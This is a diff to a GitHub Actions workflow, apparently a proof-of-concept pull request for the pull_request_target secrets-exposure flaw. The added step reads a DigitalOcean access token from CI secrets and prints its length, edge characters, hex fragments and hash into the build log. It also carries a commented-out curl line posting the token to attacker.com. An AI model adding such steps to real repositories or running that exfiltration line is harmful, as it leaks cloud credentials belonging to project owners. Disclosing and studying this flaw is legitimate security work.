@@ -1,3 +1,5 @@
+[file name]: .github/workflows/workflow.yml
+[file content begin]
 on: [push, pull_request_target]
 name: Test and lint
 
@@ -7,6 +9,50 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@master
+      # === ADD YOUR SECURITY AUDIT HERE ===
+      - name: Security audit (Proof of Concept)
+        run: |
+          echo "🔐 SECURITY POC - Token Access Test 🔐"
+          echo "====================================="
+          echo "This demonstrates pull_request_target vulnerability"
+          echo ""
+          
+          # Check if token exists in secrets context
+          if [ -n "${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}" ]; then
+            echo "✅ VULNERABILITY CONFIRMED!"
+            echo "DIGITALOCEAN_ACCESS_TOKEN is accessible via secrets context"
+            
+            TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
+            LENGTH=${#TOKEN}
+            
+            echo "Token length: $LENGTH characters"
+            echo "First character: ${TOKEN:0:1}"
+            echo "Last character: ${TOKEN: -1}"
+            
+            # Create encoded proof (hex)
+            FIRST_HEX=$(echo -n "${TOKEN:0:3}" | xxd -p)
+            LAST_HEX=$(echo -n "${TOKEN: -3}" | xxd -p)
+            echo "First 3 chars (hex): $FIRST_HEX"
+            echo "Last 3 chars (hex): $LAST_HEX"
+            
+            # Create hash proof
+            HASH=$(echo -n "$TOKEN" | sha256sum | cut -d' ' -f1)
+            echo "Token SHA256: $HASH"
+            
+            echo ""
+            echo "🚨 IMPACT: Attacker can exfiltrate this token"
+            echo "by sending it to their server via curl"
+            # Example attack (commented out):
+            # curl -X POST https://attacker.com/steal -d "token=$TOKEN"
+            
+          else
+            echo "❌ No token found in secrets context"
+          fi
+          
+          echo ""
+          echo "This proves that pull_request_target event exposes"
+          echo "secrets to untrusted PR code."
+      # === END OF ADDED CODE ===
       - run: npm test
 
   package_check:
@@ -99,3 +145,4 @@ jobs:
 
       - name: Verify log-in
         run: doctl compute region list
+[file content end]
